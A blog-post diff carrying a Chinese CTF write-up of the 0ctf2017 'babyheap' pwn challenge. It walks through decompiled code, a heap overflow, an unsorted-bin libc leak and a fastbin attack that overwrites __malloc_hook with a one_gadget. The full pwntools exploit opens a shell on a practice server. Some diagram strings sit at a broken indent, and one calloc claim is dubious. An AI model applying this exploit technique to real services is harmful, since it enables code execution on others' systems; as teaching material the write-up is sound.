@@ -1,0 +1,491 @@
+---
+layout: post
+title:  babyheap
+date:   2021-02-03 00:01:01 +0300
+image:  2021-02-03-house.jpg
+tags:   [ctf,PWN,0ctf2017]
+---
+
+菜单题，ida查看
+
+#### main
+
+```assembly
+__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  __int64 v4; // [rsp+8h] [rbp-8h]
+
+  v4 = sub_B70(a1, a2, a3);
+  while ( 1 )
+  {
+    sub_CF4();
+    sub_138C();
+    switch ( (unsigned __int64)off_14F4 )
+    {
+      case 1uLL:
+        sub_D48(v4);
+        break;
+      case 2uLL:
+        sub_E7F(v4);
+        break;
+      case 3uLL:
+        sub_F50(v4);
+        break;
+      case 4uLL:
+        sub_1051(v4);
+        break;
+      case 5uLL:
+        return 0LL;
+      default:
+        continue;
+    }
+  }
+}
+```
+
+#### menu
+
+```assembly
+int sub_CF4()
+{
+  puts("1. Allocate");
+  puts("2. Fill");
+  puts("3. Free");
+  puts("4. Dump");
+  puts("5. Exit");
+  return printf("Command: ");
+}
+```
+
+#### Allocate
+
+分配一个堆块
+
+```assembly
+void __fastcall sub_D48(__int64 a1)
+{
+  signed int i; // [rsp+10h] [rbp-10h]
+  signed int v2; // [rsp+14h] [rbp-Ch]
+  void *v3; // [rsp+18h] [rbp-8h]
+
+  for ( i = 0; i <= 15; ++i )
+  {
+    if ( !*(_DWORD *)(24LL * i + a1) )
+    {
+      printf("Size: ");
+      v2 = sub_138C();
+      if ( v2 > 0 )
+      {
+        if ( v2 > 4096 )
+          v2 = 4096;
+        v3 = calloc(v2, 1uLL);
+        if ( !v3 )
+          exit(-1);
+        *(_DWORD *)(24LL * i + a1) = 1;
+        *(_QWORD *)(a1 + 24LL * i + 8) = v2;
+        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
+        printf("Allocate Index %d\n", (unsigned int)i);
+      }
+      return;
+    }
+  }
+}
+```
+
+题目所使用的是calloc
+
+主要的不同是malloc不初始化分配的内存，calloc初始化已分配的内存为0。
+
+次要的不同是calloc返回的是一个数组，而malloc返回的是一个对象。
+
+calloc等于malloc+memset。所以malloc比calloc更高效。
+
+#### Fill
+
+填充内容
+
+```assembly
+__int64 __fastcall sub_E7F(__int64 a1)
+{
+  __int64 result; // rax
+  int v2; // [rsp+18h] [rbp-8h]
+  int v3; // [rsp+1Ch] [rbp-4h]
+
+  printf("Index: ");
+  result = sub_138C();
+  v2 = result;
+  if ( (signed int)result >= 0 && (signed int)result <= 15 )
+  {
+    result = *(unsigned int *)(24LL * (signed int)result + a1);
+    if ( (_DWORD)result == 1 )
+    {
+      printf("Size: ");
+      result = sub_138C();
+      v3 = result;
+      if ( (signed int)result > 0 )
+      {
+        printf("Content: ");
+        result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
+      }
+    }
+  }
+  return result;
+}
+```
+
+这里并没有对输入内容的长度size做判断，因此我们可以从一个堆块溢出到另一个堆块上。
+
+#### Free
+
+释放堆块
+
+```assembly
+__int64 __fastcall sub_F50(__int64 a1)
+{
+  __int64 result; // rax
+  int v2; // [rsp+1Ch] [rbp-4h]
+
+  printf("Index: ");
+  result = sub_138C();
+  v2 = result;
+  if ( (signed int)result >= 0 && (signed int)result <= 15 )
+  {
+    result = *(unsigned int *)(24LL * (signed int)result + a1);
+    if ( (_DWORD)result == 1 )
+    {
+      *(_DWORD *)(24LL * v2 + a1) = 0;
+      *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL;
+      free(*(void **)(24LL * v2 + a1 + 16));
+      result = 24LL * v2 + a1;
+      *(_QWORD *)(result + 16) = 0LL;
+    }
+  }
+  return result;
+}
+```
+
+#### Dump
+
+展示堆块的内容，可以利用它泄露信息。
+
+```assembly
+signed int __fastcall sub_1051(__int64 a1)
+{
+  signed int result; // eax
+  signed int v2; // [rsp+1Ch] [rbp-4h]
+
+  printf("Index: ");
+  result = sub_138C();
+  v2 = result;
+  if ( result >= 0 && result <= 15 )
+  {
+    result = *(_DWORD *)(24LL * result + a1);
+    if ( result == 1 )
+    {
+      puts("Content: ");
+      sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));
+      result = puts(byte_14F1);
+    }
+  }
+  return result;
+}
+```
+
+思路：
+
+* 通过**unsortedbin attack**来leak出堆的地址
+
+* 通过**fastbin attack**控制__malloc_hook
+
+* **__malloc_hook**劫持程序流
+
+首先要知道chunk的结构
+
+```assembly
+struct malloc_chunk{
+    INTERNAL_SIZE_T prev_size;   //size of previous chunk
+    INTERNAL_SIZE_T size;        //size inbytes, including overhead
+
+    struct malloc_chunk* fd;     //double links -- used only free
+    struct malloc_chunk* bk;
+    
+    ....
+}
+```
+
+默认情况下，INTERNAL_SIZE_T的大小在64位系统下是8字节，32位系统下是4字节。
+
+#### __malloc_hook
+
+__malloc_hook是glibc中的一个函数指针变量，它的原型如下：
+
+```assembly
+/*第一个同malloc的size参数，第二个参数是调用malloc的那个函数的地址*/
+void * function(size_t size, void * caller)
+```
+
+可见其实__malloc_hook相当于给malloc函数套了一层外壳，当这个函数指针的值**不为NULL**时，系统在调用malloc是就会触发这个hook，执行hook所指向的函数。合理构造该函数就可以达到自定义malloc的行为，**捕获**甚至**控制**返回值。类似的还有\_\_free_hook，\_\_realloc_hook 等，原理大同小异。
+
+我们可以将__malloc_hook函数指针改为got表中的其它函数指针，那么当执行malloc的时候就回去直接执行我们修改的函数。
+
+如果我们将__malloc_hook函数指针修改为one_gadget的地址，那么我们就可以在执行malloc的时候起一个shell。
+
+#### exp:
+
+```assembly
+# -*- coding: UTF-8 -*-
+from pwn import *
+
+libc = ELF("./libc-2.23.so")
+
+io = remote("node3.buuoj.cn",26273)
+
+def command(index):
+    io.sendlineafter("Command: ", str(index))
+
+def allocate(size):
+    command(1)
+    io.sendlineafter("Size: ", str(size))
+
+def fill(index, content):
+    command(2)
+    io.sendlineafter("Index: ", str(index))
+    io.sendlineafter("Size", str(len(content)))
+    io.sendlineafter("Content: ", content)
+
+def free(index):
+    command(3)
+    io.sendlineafter("Index: ", str(index))
+
+def dump(index):
+    command(4)
+    io.sendlineafter("Index: ", str(index))
+
+allocate(0x10)
+allocate(0x10)
+allocate(0x30)
+allocate(0x40)
+allocate(0x60)
+    '''
+    00 [    ][0x21]   0
+    10 [    ][    ]
+    20 [    ][0x21]   1
+    30 [    ][    ]
+    40 [    ][0x41]   2
+    50 [    ][    ]
+    60 [    ][    ]
+    70 [    ][    ]
+    80 [    ][0x51]   3
+    90 [    ][    ]
+    A0 [    ][    ]
+    B0 [    ][    ]
+    C0 [    ][    ]
+    D0 [    ][0x71]   4
+    E0 [    ][    ]
+    F0 [    ][    ]
+    100[    ][    ]
+    110[    ][    ]
+    120[    ][    ]
+    130[    ][    ]
+    Top chunk
+    '''
+
+fill(0, p64(0x51)*4)
+fill(2, p64(0x31)*6)
+free(1)
+    '''
+    00 [    ][0x21]   0
+    10 [0x51][0x51]
+    20 [0x51][0x51]   1  *
+    30 [    ][    ]      *
+    40 [    ][0x41]   2  *
+    50 [0x31][0x31]      *
+    60 [0x31][0x31]      *
+    70 [0x31][0x31]
+    80 [    ][0x51]   3
+    90 [    ][    ]
+    A0 [    ][    ]
+    B0 [    ][    ]
+    C0 [    ][    ]
+    D0 [    ][0x71]   4
+    E0 [    ][    ]
+    F0 [    ][    ]
+    100[    ][    ]
+    110[    ][    ]
+    120[    ][    ]
+    130[    ][    ]
+    Top chunk
+    '''
+
+allocate(0x40)
+fill(1, p64(0x91)*4)
+    '''
+    00 [    ][0x21]   0
+    10 [0x51][0x51]
+    20 [    ][0x51]   1
+    30 [0x91][0x91]
+    40 [0x91][0x91]   2
+    50 [    ][    ]
+    60 [    ][    ]
+    70 [0x31][0x31]
+    80 [    ][0x51]   3
+    90 [    ][    ]
+    A0 [    ][    ]
+    B0 [    ][    ]
+    C0 [    ][    ]
+    D0 [    ][0x71]   4
+    E0 [    ][    ]
+    F0 [    ][    ]
+    100[    ][    ]
+    110[    ][    ]
+    120[    ][    ]
+    130[    ][    ]
+    Top chunk
+    '''
+
+free(2)
+dump(1)
+    '''
+    00 [    ][0x21]   0
+    10 [0x51][0x51]
+    20 [    ][0x51]   1
+    30 [0x91][0x91]
+    40 [0x91][0x91]   2  *
+    50 [ fd ][ bk ]      *
+    60 [    ][    ]      *
+    70 [0x31][0x31]      *
+    80 [    ][0x51]   3  *
+    90 [    ][    ]      *
+    A0 [    ][    ]      *
+    B0 [    ][    ]      *
+    C0 [    ][    ]      *
+    D0 [    ][0x71]   4
+    E0 [    ][    ]
+    F0 [    ][    ]
+    100[    ][    ]
+    110[    ][    ]
+    120[    ][    ]
+    130[    ][    ]
+    Top chunk
+    '''
+# 当释放较小或较大的chunk的时候，
+# 如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中
+# usortbin只有一个bin，它的fd和bk指针会指向同一个地址——unsorted bin链表的头部。
+
+io.recvline()
+io.recv(8*4)
+unsortedbin = u64(io.recv(6).ljust(8, "\0"))
+print(unsortedbin)
+mallock_hook = unsortedbin - 0x58 - 0x10
+# unsorted bin链表头部地址为main_arena + 0x58
+# __malloc_hook地址为main_arena - 0x10
+
+free(4)
+payload = p64(0)*9 + p64(0x71) + p64(mallock_hook-0x23)
+fill(3, payload)
+    '''
+    00 [      ][0x21]   0
+    10 [ 0x51 ][0x51]
+    20 [      ][0x51]   1
+    30 [ 0x91 ][0x91]
+    40 [ 0x91 ][0x91]   2  *
+    50 [  fd  ][ bk ]      *
+    60 [      ][    ]      *
+    70 [ 0x31 ][0x31]      *
+    80 [      ][0x51]   3  *
+    90 [ 0x00 ][0x00]      *
+    A0 [ 0x00 ][0x00]      *
+    B0 [ 0x00 ][0x00]      *
+    C0 [ 0x00 ][0x00]      *
+    D0 [ 0x00 ][0x71]   4  *
+    E0 [M-0x23][    ]      *
+    F0 [      ][    ]      *
+    100[      ][    ]      *
+    110[      ][    ]      *
+    120[      ][    ]      *
+    130[      ][    ]      *
+    Top chunk
+    '''
+
+allocate(0x60)
+    '''
+    00 [      ][0x21]   0
+    10 [ 0x51 ][0x51]
+    20 [      ][0x51]   1
+    30 [ 0x91 ][0x91]
+    40 [ 0x91 ][0x91]   2  *
+    50 [  fd  ][ bk ]      *
+    60 [      ][    ]      *
+    70 [ 0x31 ][0x31]      *
+    80 [      ][0x51]   3  *
+    90 [ 0x00 ][0x00]      *
+    A0 [ 0x00 ][0x00]      *
+    B0 [ 0x00 ][0x00]      *
+    C0 [ 0x00 ][0x00]      *
+    D0 [ 0x00 ][0x71]   4
+    E0 [MHK-23][    ]
+    F0 [      ][    ]
+    100[      ][    ]
+    110[      ][    ]
+    120[      ][    ]
+    130[      ][    ]
+    Top chunk
+    '''
+allocate(0x60)
+# 取fastbins[0x70]链表的下一个节点，
+# 即上一个chunk的fd所指向的节点——malloc_hook-0x23处的节点。
+
+libc_addr = mallock_hook - libc.symbols['__malloc_hook']
+one_gadget = libc_addr + 0x4526a
+    '''
+    0x45216 execve("/bin/sh", rsp+0x30, environ)
+    constraints:
+      rax == NULL
+
+    0x4526a execve("/bin/sh", rsp+0x30, environ)
+    constraints:
+      [rsp+0x30] == NULL
+
+    0xf02a4 execve("/bin/sh", rsp+0x50, environ)
+    constraints:
+      [rsp+0x50] == NULL
+
+    0xf1147 execve("/bin/sh", rsp+0x70, environ)
+    constraints:
+      [rsp+0x70] == NULL
+    '''
+# 为了改写malloc_hook的内容，
+# 需要计算从malloc_hook-0x23开始填充的字节数
+# 由于fill函数填充的是chunk的user data部分，
+# 所以跳过了chunk header部分，
+# -0x23 + 0x10 = -0x13
+payload = "a" * 0x13 + p64(one_gadget)
+
+fill(4, payload)
+allocate(1)
+
+io.interactive()
+```
+
+objdump查看系统对应版本glibc中__malloc_hook的偏移量
+
+-D表示对全部文件进行反汇编
+
+-m表示指令集架构
+
+```assembly
+$ objdump libc.so.6 -D -M intel | grep __malloc_hook
+...
+00000000003c4b10 <__malloc_hook@@GLIBC_2.2.5>:
+```
+
+得到偏移 **0x3c4b10**，加上当前系统glibc加载时的基址 **0x00007ffff7a0d000** 推算出程序运行时其在内存中的位置为 **0x00007ffff7dd1b10**。
+
+但是由于0x7ffff7dd1b10地址的指定偏移处的size成员数值不能够满足glibc的检测，因此我们需要在__malloc_hook地址附近找一块合适的地址作为我们的攻击目标。下图可以看出0x7ffff7dd1b10地址的数值都为0不符合要求。
+
+![]({{site.baseurl}}/img/2021-02-03-zero.jpg)
+
+通过尝试发现，**0x7ffff7dd1b10-0x23**地址处的指定8字节偏移处的数值能够满足glibc的检测，所以我们最终把0x7ffff7dd1b10-0x23=0x7ffff7dd1aed地址作为我们的攻击目标。从下图可以看出，**0x7ffff7dd1b10-0x23**地址的数值为0x7f，满足size成员的要求。
+
+![]({{site.baseurl}}/img/2021-02-03-0x7f.jpg)
+
